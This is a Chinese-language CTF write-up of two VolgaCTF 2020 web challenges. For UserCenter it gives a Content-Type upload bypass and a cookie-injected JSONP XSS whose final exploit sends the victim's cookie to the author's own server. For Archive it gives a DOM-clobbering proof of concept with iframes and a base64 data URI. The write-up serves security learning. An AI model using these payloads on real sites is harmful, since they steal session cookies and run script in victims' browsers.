---
title: VolgaCTF 2020 Qualifier-Web
date: 2020-04-22 17:35:57
tags: CTF
---

### UserCenter

首先大概一下浏览基本功能

- 登陆/注册
- 查看个人信息以及修改个人信息和头像
- Report Bug将URL发送给admin进行xss

大概测试了一下，发现如下：

修改个人信息的地方会进行html实体编码没法xss，头像处试过传了下svg，发现不太行，网站对type做了限制，限制了svg以及xml等文件的上传，并且它是把网站上传的图片放到static子域进行储存的。

不过发现我们可以通过控制type的类型来控制返回文件的类型. 我是通过`text/plain;,text/html`来进行bypass的，因为在Chrome中是支持以逗号分隔的多种内容类型的，所以可以利用这个来进行Bypass.

![GQfQCF.png](https://s1.ax1x.com/2020/03/31/GQfQCF.png)

看了下国外大哥的wp,发现他fuzz出了更多可执行xss的Content-Type, tql..

详细可以看这篇文章

https://blog.blackfan.ru/2020/03/volgactf-2020-qualifier-writeup.html

接下来可以看下主页面的main.js..(我刚开始没发现这个文件..)

```javascript
function getUser(guid) {
    if (guid) {
        $.getJSON(`//${api}.volgactf-task.ru/user?guid=${guid}`, function(
            data
        ) {
            if (!data.success) {
                location.replace("/profile.html");
            } else {
                profile(data.user);
            }
        });
    } else {
        $.getJSON(`//${api}.volgactf-task.ru/user`, function(data) {
            if (!data.success) {
                location.replace("/login.html");
            } else {
                profile(data.user, true);
            }
        }).fail(function(jqxhr, textStatus, error) {
            console.log(jqxhr, textStatus, error);
        });
    }
}

function updateUser(user) {
    $.ajax({
        type: "POST",
        url: `//${api}.volgactf-task.ru/user-update`,
        data: JSON.stringify(user),
        contentType: "application/json",
        dataType: "json"
    }).done(function(data) {
        if (!data.success) {
            showError(data.error);
        } else {
            location.replace(`/profile.html`);
        }
    });
}

function logout() {
    $.get(`//${api}.volgactf-task.ru/logout`, function(data) {
        location.replace("/login.html");
    });
}

function profile(user, edit) {
    if (
        !["/profile.html", "/report.php", "/editprofile.html"].includes(
            location.pathname
        )
    )
        location.replace("/profile.html");
    $("#username").text(user.username);
    $("#username").val(user.username);
    $("#bio").text(user.bio);
    $("#bio").val(user.bio);
    $("#avatar").attr("src", `//static.volgactf-task.ru/${user.avatar}`);
    if (edit) {
        $("#editProfile").removeClass("d-none");
    }
    $('.nav-item .nav-link[href="/login.html"]').addClass("d-none");
    $('.nav-item .nav-link[href="/register.html"]').addClass("d-none");
    $('.nav-item .nav-link[href="/profile.html"]').removeClass("d-none");
    $('.nav-item .nav-link[href="/logout.html"]').removeClass("d-none");
}

function replaceForbiden(str) {
    return str
        .replace(/[ !"#$%&Вґ()*+,\-\/:;<=>?@\[\\\]^_`{|}~]/g, "")
        .replace(/[^\x00-\x7F]/g, "?");
}

function showError(error) {
    $("#error")
        .removeClass("d-none")
        .text(error);
}

$(document).ready(function() {
    api = "api";
    if (Cookies.get("api_server")) {
        api = replaceForbiden(Cookies.get("api_server"));
    } else {
        Cookies.set("api_server", api, { secure: true });
    }

    $.ajaxSetup({
        xhrFields: {
            withCredentials: true
        }
    });

    $("#logForm").submit(function(event) {
        event.preventDefault();
        $.ajax({
            type: "POST",
            url: `//${api}.volgactf-task.ru/login`,
            data: JSON.stringify({
                username: $("#username").val(),
                password: $("#password").val()
            }),
            contentType: "application/json",
            dataType: "json"
        }).done(function(data) {
            if (!data.success) {
                showError(data.error);
            } else {
                location.replace(`/profile.html?guid=${data.guid}`);
            }
        });
    });

    $("#regForm").submit(function(event) {
        event.preventDefault();
        $.ajax({
            type: "POST",
            url: `//${api}.volgactf-task.ru/register`,
            data: JSON.stringify({
                username: $("#username").val(),
                password: $("#password").val()
            }),
            contentType: "application/json",
            dataType: "json"
        }).done(function(data) {
            if (!data.success) {
                showError(data.error);
            } else {
                location.replace(`/profile.html`);
            }
        });
    });

    $("#avatar").on("change", function() {
        $(this)
            .next(".custom-file-label")
            .text($(this).prop("files")[0].name);
    });

    $("#editForm").submit(function(event) {
        event.preventDefault();
        b64Avatar = "";
        mime = "";
        bio = $("#bio").val();
        avatar = $("#avatar").prop("files")[0];
        if (avatar) {
            reader = new FileReader();
            reader.readAsDataURL(avatar);
            reader.onload = function(e) {
                b64Avatar = reader.result.split(",")[1];
                mime = avatar.type;
                updateUser({ avatar: b64Avatar, type: mime, bio: bio });
            };
        } else {
            updateUser({ bio: bio });
        }
    });

    params = new URLSearchParams(location.search);

    if (
        [
            "/",
            "/index.html",
            "/profile.html",
            "/report.php",
            "/editprofile.html"
        ].includes(location.pathname)
    ) {
        getUser(params.get("guid"));
    }
    if (["/logout.html"].includes(location.pathname)) {
        logout();
    }
});
```

漏洞点：

```javascript
$(document).ready(function() {
    api = "api";
    if (Cookies.get("api_server")) {
        api = replaceForbiden(Cookies.get("api_server"));
    } else {
        Cookies.set("api_server", api, { secure: true });
    }

    $.ajaxSetup({
        xhrFields: {
            withCredentials: true
        }
    });
    
    
 //   
    
 function getUser(guid) {
    if (guid) {
        $.getJSON(`//${api}.volgactf-task.ru/user?guid=${guid}`, function(
            data
        ) {
            if (!data.success) {
                location.replace("/profile.html");
            } else {
                profile(data.user);
            }
        });
    } else {
        $.getJSON(`//${api}.volgactf-task.ru/user`, function(data) {
            if (!data.success) {
                location.replace("/login.html");
            } else {
                profile(data.user, true);
            }
        }).fail(function(jqxhr, textStatus, error) {
            console.log(jqxhr, textStatus, error);
        });
    }
}
```

在一段代码中我们可以看出来api变量的赋值时通过cookie进行的，在第二段getUser函数中子域名是通过api变量去确认的

```
$.getJSON(`//${api}.volgactf-task.ru/user?guid=${guid}...
```

但是在可控制api变量的情况下我们实际上是可以控制请求的网址的。比如另api为exploit.lihuaiqiu.top?，那么实际请求的URL为https://exploit.lihuaiqiu.top?.volgactf-task.ru/user?guid=${guid} 即可控制请求的网址，但是在main.js有这样一个过滤函数

```
function replaceForbiden(str) {
    return str
        .replace(/[ !"#$%&Вґ()*+,\-\/:;<=>?@\[\\\]^_`{|}~]/g, "")
        .replace(/[^\x00-\x7F]/g, "?");
}
```

这里对?进行替空 并且对\x00-\x7F换成?..所以直接用\x00-\x7F间的字符bypass一下就可以了

最后我们需要通过getJSON函数来触发xss.简单的看一下介绍：

![GQfyDI.png](https://s1.ax1x.com/2020/03/31/GQfyDI.png)

本地简单试一下

在我们的网站放入xss语句

```
({"xss":alert(1)});
```

调用getJSON函数，成功触发xss

![GQhIJO.png](https://s1.ax1x.com/2020/03/31/GQhIJO.png)

所以这里我们只需要将参数控制为?即可xss，回到之前的代码

```javascript
    $.getJSON(`//${api}.volgactf-task.ru/user?guid=${guid}`, function(
        data
    ) {
        if (!data.success) {
            location.replace("/profile.html");
        } else {
            profile(data.user);
        }
    });
    
    //
    if (
        [
            "/",
            "/index.html",
            "/profile.html",
            "/report.php",
            "/editprofile.html"
        ].includes(location.pathname)
    ) {
        getUser(params.get("guid"));
    }

```

通过上面代码 可分析得在path有上面数组中的任意一个，将传第guid参数给getUser，那我们只要给guid一个?就可以了

最终exp

```html
<html>
<script>
    document.cookie = "api_server=exploit.lihuaiqiu.top\x77; domain=volgactf-task.ru;";
    window.location = 'https://volgactf-task.ru/report.php?guid=?'
</script>
</html>
```

在https://exploit.lihuaiqiu.top放上构造好的xss语句

```javascript
({"test":window.location='vps'+document.location});


```

自己vps监听下即可收到cookie

![Gl8ggJ.png](https://s1.ax1x.com/2020/03/31/Gl8ggJ.png)

当然还有另一种更有趣的回调操作

俄罗斯带哥找到了回溯的正则表达，膜，如下：

```
>  1.7.2 /(=)\?(?=&|$)|\?\?/
<= 1.7.2 /(\=)\?(&|$)|\?\?/i
<= 1.5.1 /(\=)\?(&|$)|()\?\?()/i
<= 1.4.4 /\=\?(&|$)/
<= 1.4.2 /=\?(&|$)/
<= 1.2.1 /=(\?|%3F)/g
<  1.2   not supported
```

所以我们完全可以不用考虑guid的传值，直接进行回调，并且??后面是可以接受任意其他字符的，如下：

![GldVl8.png](https://s1.ax1x.com/2020/04/01/GldVl8.png)

都可成功回调

### VolgaCTF Archive

蛮有趣的一道题

主要代码如下

```html
<script src="./js/pages.js"></script>
<script>
  $(window).on('hashchange', function(e) {
    volgactf.activePage.location=location.hash.slice(1);
    if(volgactf.pages[volgactf.activePage.location]) {
      $('#page').attr('src',volgactf.pages[volgactf.activePage.location]);
      $('.active').removeClass('active');
      $('.nav-item > a:contains('+volgactf.activePage.location+')').addClass('active');
    }
  });
  $(document).ready(function() {
    if(location.hash.slice(1) != '2019') {
      $(window).trigger('hashchange');
    }
  });
</script>
```

page.js

```javascript
volgactf = {
pages: {
'2011': './html/2011.html',
'2012': './html/2012.html',
'2013': './html/2013.html',
'2014': './html/2014.html',
'2015': './html/2015.html',
'2016': './html/2016.html',
'2017': './html/2017.html',
'2018': './html/2018.html',
'2019': './html/2019.html'
},
activePage: {
location: 2019
}
};
```

主要代码逻辑就是通过对page.js的加载更改location.hash切换页面

如果我们可以将 volgactf.activePage.location的值替换为javascript:alert(1)的话，即可造成xss攻击

所以目前要做的就是将volgactf.active覆盖为一个window对象，对于覆盖的实现可以使用Dom clobbering进行覆盖，不过volgactf.active在题目中已经是一个被声明的变量了，我们需要使这个变量变成未定义的状态，在旧版本的chrome中可以通过xss-auditor进行变量移除，不过在新版本中已经被删掉了。

但是在这个题目中可以通过另外的方式使得此变量变成未定义的模式，此变量的获取是通过page.js进行变量赋值的，我们可以通过一些手段使得Page.js无法成功加载达到此目的

大概有两种方法，如下：

- Nginx与浏览器的解析差异问题

对于https://archive.q.2020.volgactf.ru/x/..%2F来讲，如果Nginx进行解析的话，实际上请求的是https://archive.q.2020.volgactf.ru，但是浏览器并不会对%2F进行解码，会将其视作文件，所以最后通过script调用page.js实际产生的是https://archive.q.2020.volgactf.ru/x/js/page.js，进一步可成功得到未定义的volgactf.activePage

- 通过斜线构造超长URL

```
https://archive.q.2020.volgactf.ru////[.....]/////              200 OK

https://archive.q.2020.volgactf.ru////[.....]/////js/main.js    414 Request-URI Too Large
```

触发414，同样无法成功加载page.js，进而得到未定义的volgactf.activePage

回归本体的攻击思路

- 首先通过iframe引入https://archive.q.2020.volgactf.ru/x/..%2F（子页面）
- 构造frames[0].frames[0].location构造孙页面
- 孙页面的iframe设置name为activePage,并且将此页面的window.name设置为volgactf，此时相当于成功污染子页面的volgactf变量，最后将volgactf.activePage设置为与题目同域的window对象

最后的利用Poc如下

```html
<iframe src='https://archive.q.2020.volgactf.ru/x/..%2f'></iframe>
<script>
window.onload=function (){
  frames[0].frames[0].location='data:text/html;base64,PGlmcmFtZSBuYW1lPWFjdGl2ZVBhZ2Ugc3JjPWh0dHBzOi8vYXJjaGl2ZS5xLjIwMjAudm9sZ2FjdGYucnUvP2FhYT48L2lmcmFtZT48c2NyaXB0PndpbmRvdy5uYW1lPSd2b2xnYWN0Zic7PC9zY3JpcHQ+';
  setTimeout(function(){frames[0].location='https://archive.q.2020.volgactf.ru/x/..%2f#javascript:alert(document.domain)'},1000)
}
</script>
```

